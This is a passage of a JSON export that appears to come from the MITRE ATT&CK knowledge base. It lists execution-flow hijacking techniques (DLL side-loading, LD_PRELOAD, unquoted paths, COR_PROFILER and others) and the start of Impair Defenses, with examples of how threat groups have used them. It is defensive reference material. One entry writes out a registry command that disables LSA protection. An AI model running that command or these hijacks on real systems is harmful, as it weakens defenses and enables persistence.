WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll)."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used search order hijacking to run the loader Vcrodat."}]}, {"name": "DLL Side-Loading", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).", "detailed_description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "id": "T1574.002", "examples": [{"id": "G0073", "name": "APT19", "description": "APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL."}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools."}, {"id": "G0050", "name": "APT32", "description": "APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used legitimate executables to perform DLL side-loading of their malware."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable."}, {"id": "S0127", "name": "BBSRAT", "description": "DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used legitimate applications to side-load malicious DLLs."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL  and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used side loading to place malicious DLLs in memory."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy can use a digitally signed binary (\"Logitech Bluetooth Wizard Host Process\") to load its dll into memory."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has abused legitimate executables to side-load weaponized DLLs."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can store a file named mpsvc.dll, which opens a malicious mpsvc.mui file, in the same folder as the legitimate Microsoft executable MsMpEng.exe to gain execution."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used legitimate software to side-load PlugX loaders onto victim systems. Daggerfly is also linked to multiple other instances of side-loading for initial loading activity."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate includes one infection vector that leverages a malicious \"KeyScramblerE.DLL\" library that will load during the execution of the legitimate KeyScrambler application."}, {"id": "S0354", "name": "Denis", "description": "Denis exploits a security vulnerability to load a fake DLL and execute its code."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can abuse legitimate Windows executables to side-load malicious DLL files."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has placed a malicious payload in %WINDIR%\\SYSTEM32\\oci.dll so it would be sideloaded by the MSDTC service."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used DLL side-loading to execute its payload."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507)."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher uses DLL side-loading to load malicious programs."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine."}, {"id": "S0032", "name": "gh0st RAT", "description": "A gh0st RAT variant has used DLL side-loading."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa\u2019s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has used DLL side-loading."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload."}, {"id": "S0528", "name": "Javali", "description": "Javali can use DLL side-loading to load malicious DLLs into legitimate executables."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can use DLL side-loading to load malicious DLLs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe has been executed as a file named DsNcDiag.dll through side-loading."}, {"id": "S0582", "name": "LookBack", "description": "LookBack side loads its communications module as a DLL into the libcurl.dll loader."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used legitimate executables such as winword.exe and igfxem.exe to side-load their malware."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can support an HKCMD sideloading start method."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has side-loaded its malicious DLL file."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used DLL side-loading to load malicious DLL's into legitimate executables."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can use DLL side-loading to gain execution."}, {"id": "S1100", "name": "Ninja", "description": "Ninja loaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the legitimate Windows services IKEEXT and PrintNotify to side-load malicious DLLs."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can use DLL side-loading to execute malicious payloads."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading."}, {"id": "S1102", "name": "Pcexter", "description": "Pcexter has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has used DLL side-loading to evade anti-virus."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can side-load Goopdate.dll into GoogleUpdate.exe."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to use DLL side-loading for execution."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use side-loading to run malicious executables."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can use legitimate, signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can be installed via DLL side-loading."}, {"id": "S0074", "name": "Sakula", "description": "Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has used a malicious loader DLL file to execute the credwiz.exe process and side-load the malicious payload Duser.dll."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can load DLLs through vulnerable legitimate executables."}, {"id": "S0098", "name": "T9000", "description": "During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear has used DLL side loading to import and load a malicious DLL loader."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has used DLL side-loading to load malicious payloads."}]}, {"name": "Dylib Hijacking", "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.", "detailed_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1574.004", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application."}]}, {"name": "Executable Installer File Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.  If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "id": "T1574.005", "examples": []}, {"name": "Dynamic Linker Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s os.environ.\nOn Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file. Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.", "id": "T1574.006", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has configured payloads to load via LD_PRELOAD."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda modified the ld.so preload file in Linux environments to enable persistence for Winnti malware."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER copies the malicious file /data2/.bd.key/preload.so to /lib/preload.so, then launches a child process that executes the malicious file /data2/.bd.key/authd as /bin/authd with the arguments /lib/preload.so reboot newreboot 1. This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence."}, {"id": "S0377", "name": "Ebury", "description": "When Ebury is running as an OpenSSH server, it uses LD_PRELOAD to inject its malicious shared module in to programs launched by SSH sessions. Ebury hooks the following functions from libc to inject into subprocesses;  system, popen, execve, execvpe, execv, execvp, and execl."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has modified /etc/ld.so.preload to intercept shared library import functions."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET adds malicious file paths to the DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables to execute malicious code."}]}, {"name": "Path Interception by PATH Environment Variable", "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in C:\\example path, which by default precedes C:\\Windows\\system32\\net.exe in the PATH environment variable, when \"net\" is executed from the command-line the C:\\example path will be called instead of the system's legitimate executable at C:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter.\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the $PATH variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the /etc/paths.d folder contents.", "id": "T1574.007", "examples": [{"id": "S1111", "name": "DarkGate", "description": "DarkGate overrides the %windir% environment variable by setting a Registry key, HKEY_CURRENT_User\\Environment\\windir, to an alternate command to execute a malicious AutoIt script. This allows DarkGate to run every time the scheduled task DiskCleanup is executed as this uses the path value %windir%\\system32\\cleanmgr.exe for execution."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable."}]}, {"name": "Path Interception by Search Order Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.", "id": "T1574.008", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit search order hijacking vulnerabilities."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities."}]}, {"name": "Path Interception by Unquoted Path", "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\nService paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\").  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program.\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.", "id": "T1574.009", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit unquoted path vulnerabilities."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities."}]}, {"name": "Services File Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "id": "T1574.010", "examples": [{"id": "S0089", "name": "BlackEnergy", "description": "One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."}]}, {"name": "Services Registry Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. ", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\nThe Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service\u2019s Registry tree to point to a malicious DLL.\nAdversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.", "id": "T1574.011", "examples": [{"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the svchost.exe process."}]}, {"name": "COR_PROFILER", "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.", "detailed_description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.", "id": "T1574.012", "examples": [{"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active."}]}, {"name": "KernelCallbackTable", "description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.", "detailed_description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.\nAn adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\nA pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function). Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload. Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.", "id": "T1574.013", "examples": [{"id": "S0182", "name": "FinFisher", "description": "FinFisher has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode."}]}, {"name": "AppDomainManager", "description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.", "id": "T1574.014", "examples": [{"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader is executed via the AppDomainManager injection technique."}]}]}, {"name": "Impair Defenses", "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.", "detailed_description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.", "id": "T1562", "examples": [{"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has disabled LSA protection on compromised hosts using \"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet reduces the integrity level of objects to allow write actions."}], "sub_techniques": [{"name": "Disable or Modify Tools", "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.", "detailed_description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.\nAdversaries may also focus on specific applications such as Sysmon. For example, the \"Start\" and \"Enable\" values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging.\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at 